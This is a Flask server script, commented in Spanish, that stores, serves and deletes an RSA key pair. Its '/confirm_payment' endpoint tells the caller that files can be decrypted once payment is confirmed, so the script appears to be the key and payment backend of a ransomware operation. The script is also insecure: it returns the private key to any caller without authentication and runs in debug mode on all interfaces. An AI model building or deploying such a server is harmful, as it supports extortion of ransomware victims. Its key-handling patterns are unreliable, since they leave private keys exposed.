from flask import Flask, request, jsonify
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import os

app = Flask(__name__)

# Archivos donde almacenar las claves
public_key_file = 'public_key.pem'
private_key_file = 'private_key.pem'

# Ruta para almacenar las claves públicas y privadas
@app.route('/store_key', methods=['POST'])
def store_key():
    data = request.json

    public_key_pem = data.get('public_key')
    private_key_pem = data.get('private_key')

    if public_key_pem and private_key_pem:
        try:
            # Convertir las claves de PEM a objetos de clave
            public_key = serialization.load_pem_public_key(public_key_pem.encode())
            private_key = serialization.load_pem_private_key(private_key_pem.encode(), password=None)

            # Guardar las claves en archivos
            with open(public_key_file, 'wb') as pub_file:
                pub_file.write(public_key_pem.encode())
            
            with open(private_key_file, 'wb') as priv_file:
                priv_file.write(private_key_pem.encode())

            return jsonify({"message": "Claves almacenadas correctamente."}), 200
        except Exception as e:
            return jsonify({"error": f"Error al almacenar las claves: {e}"}), 400
    else:
        return jsonify({"error": "Las claves pública y privada son requeridas."}), 400

# Ruta para obtener la clave pública
@app.route('/get_key', methods=['GET'])
def get_key():
    if os.path.exists(public_key_file):
        with open(public_key_file, 'rb') as pub_file:
            public_key_pem = pub_file.read()
        public_key = serialization.load_pem_public_key(public_key_pem)
        return jsonify({"public_key": public_key_pem.decode()}), 200
    else:
        return jsonify({"error": "No se encontró una clave pública almacenada."}), 404

# Ruta para obtener la clave privada
@app.route('/get_private_key', methods=['GET'])
def get_private_key():
    if os.path.exists(private_key_file):
        with open(private_key_file, 'rb') as priv_file:
            private_key_pem = priv_file.read()
        private_key = serialization.load_pem_private_key(private_key_pem, password=None)
        return jsonify({"private_key": private_key_pem.decode()}), 200
    else:
        return jsonify({"error": "No se encontró una clave privada almacenada."}), 404

# Ruta para eliminar las claves almacenadas
@app.route('/delete_keys', methods=['DELETE'])
def delete_keys():
    try:
        if os.path.exists(public_key_file):
            os.remove(public_key_file)
        if os.path.exists(private_key_file):
            os.remove(private_key_file)
        
        return jsonify({"message": "Las claves han sido eliminadas correctamente."}), 200
    except Exception as e:
        return jsonify({"error": f"Error al eliminar las claves: {e}"}), 400



# Ruta para confirmar el pago
@app.route('/confirm_payment', methods=['POST'])
def confirm_payment():
    data = request.json
    
    if 'payment_confirmed' in data and data['payment_confirmed'] is True:
        # Confirmación de pago procesada
        print("Pago confirmado correctamente.")
        return jsonify({"message": "Pago confirmado, los archivos pueden ser desencriptados."}), 200
    else:
        return jsonify({"error": "No se ha confirmado el pago."}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
